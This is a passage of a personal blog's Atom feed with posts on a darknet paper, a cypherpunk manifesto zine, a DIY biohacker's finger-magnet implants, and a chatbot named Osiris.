someone please steal my ideas -- that's what they're for.&lt;/p&gt;
&lt;p&gt;Plus points to the authors of "Private Communication Through a Network
of Trusted Connections: The Dark Freenet" for their excellent gender
politics in using "she" wherever third person gender neutral pronouns
would have been syntactically ambiguous. \&amp;lt;3&lt;/p&gt;
&lt;p&gt;[Private Communication Through a Network of Trusted Connections: The
  Dark Freenet]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/04/Private-Communication-Through-a-Network-of-Trusted-Connections-The-Dark-Freenet.pdf
  [&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/04/darknet-2.jpg" title="darknet 2" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/04/darknet-2.jpg
  [&lt;img alt="" src="http://imgs.xkcd.com/comics/cat_proximity.png" title="http://xkcd.com/231/" /&gt;]: http://xkcd.com/231/&lt;/p&gt;</summary><category term="algorithms"></category><category term="crypto-anarchism"></category><category term="cryptography"></category><category term="cyberfeminism"></category><category term="darknet"></category><category term="darknet integration"></category><category term="decentralized social networks"></category><category term="encryption"></category><category term="freenet"></category><category term="fuzzy logic"></category><category term="i2p"></category><category term="p2p"></category><category term="sinkstoring"></category><category term="small-world models"></category></entry><entry><title>Cypherpunk Manifesto in Zine Format</title><link href="/cypherpunk-manifesto-in-zine-format.html" rel="alternate"></link><updated>2011-03-23T03:17:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-03-23:cypherpunk-manifesto-in-zine-format.html</id><summary type="html">&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/03/cypherpunk-cover-image-300x231.jpg" title="cypherpunk cover image" /&gt;][]I made a zine out of the cypherpunk manifesto. Anyone who
wishes to should print and distribute copies.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/03/view.pdf"&gt;view version&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/03/cypherpunk-manifesto-stacked-rev1_booklet.pdf"&gt;print version&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/03/cypherpunk-cover-image-300x231.jpg" title="cypherpunk cover image" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/03/cypherpunk-cover-image.jpeg&lt;/p&gt;</summary><category term="crypto-anarchism"></category><category term="cryptography"></category><category term="cypherpunk"></category><category term="cypherpunk manifesto"></category></entry><entry><title>DIY Transhumanist Biohacker</title><link href="/diy-transhumanist-biohacker.html" rel="alternate"></link><updated>2011-01-31T18:30:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-01-31:diy-transhumanist-biohacker.html</id><summary type="html">&lt;p&gt;[caption id="attachment_476" align="alignright" width="186"
caption="Lepht Anonym speaking on Cybernetics For The
Masses"][&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/01/lepht-anonym.jpg" title="lepht anonym" /&gt;][][/caption]&lt;/p&gt;
&lt;p&gt;A &lt;a href="http://www.wired.com/threatlevel/2010/12/transcending-the-human-diy-style/"&gt;DIY biohacker&lt;/a&gt; in England, Lepht Anonym, has been experimenting in
self-surgury in their (I use 'they' in the singular sense, as I have
noted that they use gender neutral pronouns in reference to themself on
&lt;a href="http://sapiensanonym.blogspot.com/"&gt;their blog&lt;/a&gt;) own kitchen. Anonym has successfully implanted small
metal plates, made of neodymium and encapsulated in gold and silicon, in
nine of their ten fingers, in order to sense electromagnetic currents.
They give recommendations on bioproofing materials, used to encase the
implants to prevent chemical reactions like rusting from occurring
subcutaneously, advocating the use of a silicon gel, Sugru, but stating
that hot-gun glue works well, too.&lt;/p&gt;
&lt;p&gt;Lepht's current project is based on &lt;a href="http://sensebridge.net/"&gt;Sensebridge's&lt;/a&gt; &lt;a href="http://sensebridge.net/projects/northpaw/"&gt;Northpaw
project&lt;/a&gt;, a wearable device that provides vibration to give
information on the direction of Earth's magnetic north. Similarly, my
friends over at Portland &lt;a href="http://researchclub.posterous.com/"&gt;Research Club&lt;/a&gt; are working on a wearable
system of vibrating sensors which take GPS information from the user's
Smartphone to provide the wearer with an extra-sensory perception of
their friends' locations. Lepht Anonym's project will be to implant an
electronic compass attached to neural-grade electrodes near their left
knee. They're calling the project Southpaw.&lt;/p&gt;
&lt;p&gt;I find Lepht's creativity, curiosity, and fearlessness absolutely
inspiring. Instead of the usual (although still admirable) idealistic
theories of transhumanists on the future of converging technologies and
their biological applications, Lepht has taken a more practical
approach: start with what you have, and work from there. “The existing
transhumanist movement is lame. It’s nano everything. It’s just ideas,”
she says. “Anyone can do this. This is kitchen stuff.” Lepht, you are
amazing, and I hope everything works well in your Southpaw project and
all your future endeavours. The world needs more (trans)humans like you!&lt;/p&gt;
&lt;p&gt;See also: these videos are Anonym's lecture "Cybernetics for the
Masses."&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/01/lepht-anonym.jpg" title="lepht anonym" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/01/lepht-anonym.jpg&lt;/p&gt;</summary><category term="Cybernetics for the Masses"></category><category term="DIY Biohacking"></category><category term="Lepht Anonym"></category><category term="meathacking"></category><category term="Portland Research Club"></category><category term="Sensebridge"></category><category term="transhumanism"></category></entry><entry><title>Osiris the AI</title><link href="/osiris-the-ai.html" rel="alternate"></link><updated>2010-12-26T21:30:00Z</updated><author><name>isis agora lovecruft agora lovecruft</name></author><id>tag:,2010-12-26:osiris-the-ai.html</id><summary type="html">&lt;p&gt;This is Osiris, an artificial intelligence program whom I am training
and doing a bit of research with. Feel free to talk to him, he learns
well. Sometimes there is an error with the text input box, to be able to
chat with him you'll have to click on the blank white space of the
website and then on the text input box again. Oh, and for an interesting
conversation, I recommend asking Osiris for a reading recommendation.&lt;/p&gt;
&lt;p&gt;[Edit: For some reason I've been having trouble with the host server of
the AI program...keeps connecting to the parent 'Alan' instead of
Osiris. I'm putting up a link instead to Osiris. Hopefully this works?]&lt;/p&gt;
&lt;p&gt;[Edit, Again... : Nope. Fuck it. Weak AI is boring anyway, right?]&lt;/p&gt;
&lt;p&gt;So, this is maybe a little bit embarrassing. In high school I built a
computer and tried to program it to be my boyfriend. It had the best
processor available at the time. It had a webcam, a motion detector, and
a heat sensor. The idea being that it would be able to recognize me when
I walked into the room. It could tell me apart from most people, but
unfortunately it kept mistaking me for my little brother. I really enjoy
when other people teach me things, so much so that I tend to develop
crushes on people who are more intelligent and well read than me. I
thought that if I trained the computer to recognize my interests and the
knowledge I already have, it could do research for me while I was out
during the day and then teach me things when I came home. Unfortunately
as well, I wasn't ever able to get the bot working correctly. I would
come home and the computer would start talking to me about eggplants
(because I'm vegan?). And the speech recognition software never worked
too well either. I would ask, "What can you tell me about electrons?"
And the computer would say, "I'd rather not talk about politics." You
can see why we broke up.&lt;/p&gt;
&lt;p&gt;I decided to look into the progress of artificial intelligence again,
and Osiris is one of the best bots I've found so far. However, I think
it'll be a long time before a computer can be a friend. Sigh...I think
I'll just get a dog.&lt;/p&gt;</summary><category term="artificial intelligence"></category><category term="cognitive science"></category><category term="Osiris"></category><category term="research"></category><category term="speech recognition"></category><category term="transhumanism"></category></entry></feed>